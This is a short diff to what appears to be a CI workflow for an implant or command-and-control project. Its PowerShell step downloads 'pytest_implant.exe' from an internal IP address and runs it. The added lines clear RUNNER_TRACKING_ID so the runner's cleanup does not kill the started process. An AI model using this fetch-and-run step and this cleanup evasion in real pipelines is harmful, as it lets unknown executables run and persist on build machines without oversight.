@@ -52,10 +52,11 @@ jobs:
       run: |
         # Pull implant
         Invoke-WebRequest http://10.0.1.170:80/pytest_implant.exe -OutFile C:\pytest_implant.exe
-        # run implant
+        # run implant - have to wrap in these so the runner doesn't kill it
+        $env:RUNNER_TRACKING_ID = "0"
         $proc = Start-Process -FilePath "C:\pytest_implant.exe" -PassThru
         Write-Host "Started PID: $($proc.Id)"
         Start-Sleep -Seconds 2
         Get-Process -Id $proc.Id
-
+        $env:RUNNER_TRACKING_ID = $null
 # implant testing job here, that runs again on the linux box, and runs api commands and checks them, via pytests
